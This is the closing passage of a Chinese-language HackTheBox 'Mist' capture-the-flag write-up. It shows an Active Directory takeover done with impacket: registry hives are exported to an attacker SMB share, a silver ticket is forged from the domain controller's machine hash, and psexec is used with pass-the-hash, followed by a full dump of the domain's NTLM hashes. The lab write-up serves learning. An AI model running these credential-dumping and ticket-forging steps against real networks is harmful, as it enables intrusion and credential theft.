<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~/Tools/impacket/bin/python3 ~/Tools/impacket/examples/smbserver.py  -smb2support miao .</span><br><span class="line"></span><br><span class="line">proxychains4 ~/Tools/impacket/bin/python3 ~/Tools/impacket/examples/reg.py mist.htb/svc_cabackup@dc01.mist.htb -k -no-pass -dc-ip 192.168.100.100 backup -o '\\10.10.16.13\miao\'</span><br><span class="line"></span><br><span class="line">proxychains4 ~/Tools/impacket/bin/python3 ~/Tools/impacket/examples/secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e121bd371bd4bbaca21175947013dd7:::</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260</span></span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040127.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>得到的是本地Administrator不能直接用，但也得到了DC01的machine hash，然后就可以直接制作票据再去dump域Administrator了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ~/Tools/impacket/bin/python3 ~/Tools/impacket/examples/ticketer.py -domain-sid S-1-5-21-1045809509-3006658589-2426055941 -domain mist.htb -spn HOST/DC01.mist.htb -nthash e768c4cf883a87ba9e96278990292260 -user-id 500 Administrator</span><br><span class="line">export KRB5CCNAME=./Administrator.ccache</span><br><span class="line"></span><br><span class="line">proxychains4 ~/Tools/impacket/bin/python3 ~/Tools/impacket/examples/secretsdump.py Administrator@dc01.mist.htb -k -no-pass -just-dc-user Administrator</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:b46782b9365344abdff1a925601e0385:::</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040130.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>然后就可以直接登录DC01了，也可以在上一步制作完票据后直接登录：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ~/Tools/impacket/bin/python3 ~/Tools/impacket/examples/psexec.py  Administrator@192.168.100.100 -hashes :b46782b9365344abdff1a925601e0385</span><br><span class="line"></span><br><span class="line">proxychains4 ~/Tools/impacket/bin/python3 ~/Tools/impacket/examples/psexec.py Administrator@dc01.mist.htb -k -no-pass</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040128.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040129.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ~/Tools/impacket/bin/python3 ~/Tools/impacket/examples/secretsdump.py Administrator@192.168.100.100 -hashes :b46782b9365344abdff1a925601e0385 -just-dc-ntlm</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:b46782b9365344abdff1a925601e0385:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:298fe98ac9ccf7bd9e91a69b8c02e86f:::</span><br><span class="line">Sharon.Mullard:1109:aad3b435b51404eeaad3b435b51404ee:1f806175e243ed95db55c7f65edbe0a0:::</span><br><span class="line">Brandon.Keywarp:1110:aad3b435b51404eeaad3b435b51404ee:db03d6a77a2205bc1d07082740626cc9:::</span><br><span class="line">Florence.Brown:1111:aad3b435b51404eeaad3b435b51404ee:9ee69a8347d91465627365c41214edd6:::</span><br><span class="line">Jonathan.Clinton:1112:aad3b435b51404eeaad3b435b51404ee:165fbae679924fc539385923aa16e26b:::</span><br><span class="line">Markus.Roheb:1113:aad3b435b51404eeaad3b435b51404ee:74f1d3e2e40af8e3c2837ba96cc9313f:::</span><br><span class="line">Shivangi.Sumpta:1114:aad3b435b51404eeaad3b435b51404ee:4847f5daf1f995f14c262a1afce61230:::</span><br><span class="line">Harry.Beaucorn:1115:aad3b435b51404eeaad3b435b51404ee:a3188ac61d66708a2bd798fa4acca959:::</span><br><span class="line">op_Sharon.Mullard:1122:aad3b435b51404eeaad3b435b51404ee:d25863965a29b64af7959c3d19588dd7:::</span><br><span class="line">op_Markus.Roheb:1123:aad3b435b51404eeaad3b435b51404ee:73e3be0e5508d1ffc3eb57d48b7b8a92:::</span><br><span class="line">svc_smb:1125:aad3b435b51404eeaad3b435b51404ee:1921d81fdbc829e0a176cb4891467185:::</span><br><span class="line">svc_cabackup:1135:aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64:::</span><br><span class="line"><span class="meta">DC01$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260:::</span></span><br><span class="line"><span class="meta">MS01$</span><span class="bash">:1108:aad3b435b51404eeaad3b435b51404ee:4a74fc05400345d580cf58aec3e6d833:::</span></span><br><span class="line"><span class="meta">svc_ca$</span><span class="bash">:1124:aad3b435b51404eeaad3b435b51404ee:34956e4924985c2f1b7ba808cd54bcb8:::</span></span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>



<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>Inclusion of files without authentication · Issue #122 · pluck-cms/pluck<br><a href="https://github.com/pluck-cms/pluck/issues/122" target="_blank" rel="noopener">https://github.com/pluck-cms/pluck/issues/122</a></li>
<li>Pluck v4.7.18 - Remote Code Execution (RCE) - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/51592" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/51592</a></li>
<li>Phishing: OLE + LNK | Red Team Notes<br><a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk" target="_blank" rel="noopener">https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk</a></li>
<li>Pass the Certificate | The Hacker Recipes<br><a href="https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate" target="_blank" rel="noopener">https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate</a></li>
<li>dirkjanm/PKINITtools: Tools for Kerberos PKINIT and relaying to AD CS<br><a href="https://github.com/dirkjanm/PKINITtools" target="_blank" rel="noopener">https://github.com/dirkjanm/PKINITtools</a></li>
<li>NTLM relaying to AD CS - On certificates, printers and a little hippo - dirkjanm.io<br><a href="https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/" target="_blank" rel="noopener">https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/</a></li>
<li>WebClient abuse (WebDAV) | The Hacker Recipes<br><a href="https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient" target="_blank" rel="noopener">https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient</a></li>
<li>How to start a “Trigger Start” windows service with Powershell without elevation / admin rights | Liebensraum<br><a href="https://www.lieben.nu/liebensraum/2016/10/how-to-start-a-trigger-start-windows-service-with-powershell-without-elevation-admin-rights/" target="_blank" rel="noopener">https://www.lieben.nu/liebensraum/2016/10/how-to-start-a-trigger-start-windows-service-with-powershell-without-elevation-admin-rights/</a></li>
<li>Add Shadow Credentials Commands to Ntlmrelayx’s Interactive LDAP Shell by Tw1sm · Pull Request #1402 · fortra/impacket<br><a href="https://github.com/fortra/impacket/pull/1402" target="_blank" rel="noopener">https://github.com/fortra/impacket/pull/1402</a></li>
<li>SolomonSklash/RubeusToCcache: A small tool to convert Base64-encoded .kirbi tickets from Rubeus into .ccache files for Impacket<br><a href="https://github.com/SolomonSklash/RubeusToCcache" target="_blank" rel="noopener">https://github.com/SolomonSklash/RubeusToCcache</a></li>
<li>ShutdownRepo/pywhisker: Python version of the C# tool for “Shadow Credentials” attacks<br><a href="https://github.com/ShutdownRepo/pywhisker" target="_blank" rel="noopener">https://github.com/ShutdownRepo/pywhisker</a></li>
<li>ADCS ESC13 Abuse Technique. It is possible to configure an Active… | by Jonas Bülow Knudsen | Feb, 2024 | Posts By SpecterOps Team Members<br><a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53" target="_blank" rel="noopener">https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53</a></li>
<li>Adds support for ESC13 by sploutchy · Pull Request #196 · ly4k/Certipy<br><a href="https://github.com/ly4k/Certipy/pull/196" target="_blank" rel="noopener">https://github.com/ly4k/Certipy/pull/196</a></li>
<li>Powershell/Check-ADCSESC13.ps1 at master · JonasBK/Powershell<br><a href="https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1" target="_blank" rel="noopener">https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1</a></li>
<li>滥用ADCS进行权限提升——ESC13详解 - 先知社区<br><a href="https://xz.aliyun.com/t/13864" target="_blank" rel="noopener">https://xz.aliyun.com/t/13864</a></li>
<li>VulnLab SideCar Walkthrough. Sidecar, involved two machines WS01 and… | by Manan | Medium<br><a href="https://medium.com/@manan07/vulnlab-sidecar-walkthrough-d59d45fbc8dc" target="_blank" rel="noopener">https://medium.com/@manan07/vulnlab-sidecar-walkthrough-d59d45fbc8dc</a></li>
<li>Vulnlab — Sidecar. Sidecar, a similar AD chained like… | by ARZ101 | Mar, 2024 | Medium<br><a href="https://arz101.medium.com/vulnlab-sidecar-2611d86ba616" target="_blank" rel="noopener">https://arz101.medium.com/vulnlab-sidecar-2611d86ba616</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最終更新：<time datetime="2024-10-28T05:16:39.996Z" itemprop="dateUpdated">2024-10-28 13:16:39</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2024/04/05/Mist-HackTheBox/&title=《Mist - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2024/04/05/Mist-HackTheBox/&title=《Mist - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2024/04/05/Mist-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Mist - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2024/04/05/Mist-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2024/04/05/Mist-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2024/04/07/IClean-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">IClean - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2024/03/25/Headless-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Headless - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2025</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2024/04/05/Mist-HackTheBox/&title=《Mist - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2024/04/05/Mist-HackTheBox/&title=《Mist - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2024/04/05/Mist-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Mist - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2024/04/05/Mist-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2024/04/05/Mist-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKUlEQVR42u3aQY6DQAwF0dz/0pntjDSQ+nYnUbuLFYoC+LGwbOzHAx/P2+P+/79/IedX91xwyJAhY1sGCfE+rPQptee+eH0yZMg4gHH14PtzEi7hpS9LhgwZMkjo/PFXsLRwlCFDhoyUcV9c1srBLyRcGTJkbMXgt7tKnaQoJNe+vReXIUPGhoxaq/mZ87fMN2TIkLEV4xke/A6kNOxE8uc+MmTIGM3gCS4NKC0i07JPhgwZ5zBqoaSjAh40ieefX2TIkHEAozYG6JSG/D5ojCpDhozRDD7IrLWmtbKPr5fJkCHjBAZ5PF8Cqy1bBG+arFnIkCFjHKO2ctEfHpCPcaT0lCFDxmkMnuZqY0gS7rLkK0OGjEEM/iGsP+zsNKtohClDhozRDD7I5Lx+6PzznwwZMmYzOkNKftRaVrJsgfpyGTJkbM7orDX0xwmrMDJkyDiBQT6Z1bI4b3ofnUOGDBmjGekCRO0qPkjgiVuGDBknM9JSrzYkWLVwJkOGjDMZCwaK4bd6XqS+uEqGDBmHMdJkx8eN/ZWyeB4rQ4aMQYx0DSLejS2FGzTPMmTIGMrorE3whMiHl4trWxkyZIxgdNpUnqbTUMj/a822DBky9mXwJEua2FqC7gxHZciQcQ5jbf5OFynSJlaGDBkyeOhkSECa4c5YVIYMGTI6Y0sO4IsXaIQpQ4aMoYz0wSTJ8qHmRz+3yZAhY0NGrXVMB5+dso8vqMmQIWMc4wdeIiLgyVWspAAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
